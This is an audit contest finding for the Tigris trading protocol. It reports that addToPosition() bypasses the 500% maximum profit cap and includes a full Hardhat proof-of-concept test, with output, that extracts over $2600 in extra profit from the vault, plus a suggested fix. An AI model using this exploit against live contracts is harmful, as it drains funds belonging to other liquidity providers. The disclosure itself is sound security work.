## Tags

- bug
- 3 (High Risk)
- disagree with severity
- judge review requested
- primary issue
- selected for report
- sponsor confirmed
- edited-by-warden
- H-04

# [Bypass the maximum PnL check to take extra profit](https://github.com/code-423n4/2022-12-tigris-findings/issues/111) 

# Lines of code

https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L267-L269


# Vulnerability details

## Impact
To protect the fund of vault, the protocol has a security mechanism which limits


```
Maximum PnL is +500%. 
```
source: https://docs.tigris.trade/protocol/trading-and-fees#limitations

But the implementation is missing to check this limitation while ````addToPosition()````, an attacker can exploit it to get more profit than expected.

## Proof of Concept
The following test case shows both normal case and the exploit scenario.
In the normal case,  a 990 USD margin, get back a 500% of 4950 USD payout, and the profit is 3960 USD.
In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.

```
const { expect } = require("chai");
const { deployments, ethers, waffle } = require("hardhat");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');
const exp = require("constants");

describe("Design Specification: Maximum PnL is +500%", function () {

  let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;

  let Trading;
  let trading;

  let TradingExtension;
  let tradingExtension;

  let TradingLibrary;
  let tradinglibrary;

  let StableToken;
  let stabletoken;

  let StableVault;
  let stablevault;

  let position;

  let pairscontract;
  let referrals;

  let permitSig;
  let permitSigUsdc;

  let MockDAI;
  let mockdai;
  let MockUSDC;
  let mockusdc;

  let badstablevault;

  let chainlink;

  beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get("StableToken");
    stabletoken = await ethers.getContractAt("StableToken", StableToken.address);
    Trading = await deployments.get("Trading");
    trading = await ethers.getContractAt("Trading", Trading.address);
    await trading.connect(owner).setMaxWinPercent(5e10);
    TradingExtension = await deployments.get("TradingExtension");
    tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);
    const Position = await deployments.get("Position");
    position = await ethers.getContractAt("Position", Position.address);
    MockDAI = await deployments.get("MockDAI");
    mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);
    MockUSDC = await deployments.get("MockUSDC");
    mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);
    const PairsContract = await deployments.get("PairsContract");
    pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);
    const Referrals = await deployments.get("Referrals");
    referrals = await ethers.getContractAt("Referrals", Referrals.address);
    StableVault = await deployments.get("StableVault");
    stablevault = await ethers.getContractAt("StableVault", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);
    await network.provider.send("evm_mine");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);

    const BadStableVault = await ethers.getContractFactory("BadStableVault");
    badstablevault = await BadStableVault.deploy(StableToken.address);

    const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");
    chainlink = await ChainlinkContract.deploy();

    TradingLibrary = await deployments.get("TradingLibrary");
    tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);
    await trading.connect(owner).setLimitOrderPriceRange(1e10);
  });


  describe("Bypass the maximum PnL check to take extra profit", function () {
    let orderId;
    let closePriceData;
    let closeSig;
    let initPrice = parseEther("1000");
    let closePrice = parseEther("2000");
    beforeEach(async function () {
      let maxWin = await trading.maxWinPercent();
      expect(maxWin.eq(5e10)).to.equal(true);

      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, initPrice, 0, 2000000000, false]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      );
      
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
      orderId = await position.getCount();
      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
      expect(await position.assetOpenPositionsLength(1)).to.equal(1);
      let trade = await position.trades(orderId);
      let marginAfterFee = trade.margin;
      expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);

      // Some time later
      await network.provider.send("evm_setNextBlockTimestamp", [2000001000]);
      await network.provider.send("evm_mine");
      
      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900
      closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];
      let closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000001000, false]
        )
      );
      closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );

    });

    it.only("All profit is $9900, close the order normally, only get $3960 profit", async function () {
      let balanceBefore = await stabletoken.balanceOf(owner.address);
      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
      let balanceAfter = await stabletoken.balanceOf(owner.address);
      let marginAfterFee = parseEther("990");
      let payout = balanceAfter.sub(balanceBefore);
      expect(payout.eq(parseEther("4950"))).to.be.true;

      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);
      expect(profit.eq(parseEther("3960"))).to.be.true;

    });

    it.only("All profit is $9900, bypass the PnL check to take extra $2600 profit", async function () {
      // We increase the possition first rather than closing the profit order directly
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
      let extraMargin = parseEther("1000");
      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);

      // 60 secs later
      await network.provider.send("evm_setNextBlockTimestamp", [2000001060]);
      await network.provider.send("evm_mine");
  
      // Now we close the order to take all profit
      closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];
      let closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000001060, false]
        )
      );
      closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );

      let balanceBefore = await stabletoken.balanceOf(owner.address);
      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
      let balanceAfter = await stabletoken.balanceOf(owner.address);
      let marginAfterFee = parseEther("990").add(extraMargin.mul(990).div(1000));
      let originalProfit = parseEther("3960");
      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);
      expect(extraProfit.gt(parseEther('2600'))).to.be.true;
    });

  });
});


```

The test result
```
 Design Specification: Maximum PnL is +500%
    Bypass the maximum PnL check to take extra profit
      √ All profit is $9900, close the order normally, only get $3960 profit
      √ All profit is $9900, bypass the PnL check to take extra $2600 profit
```

## Tools Used
VS Code

## Recommended Mitigation Steps
Add a check for ````addToPosition()```` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.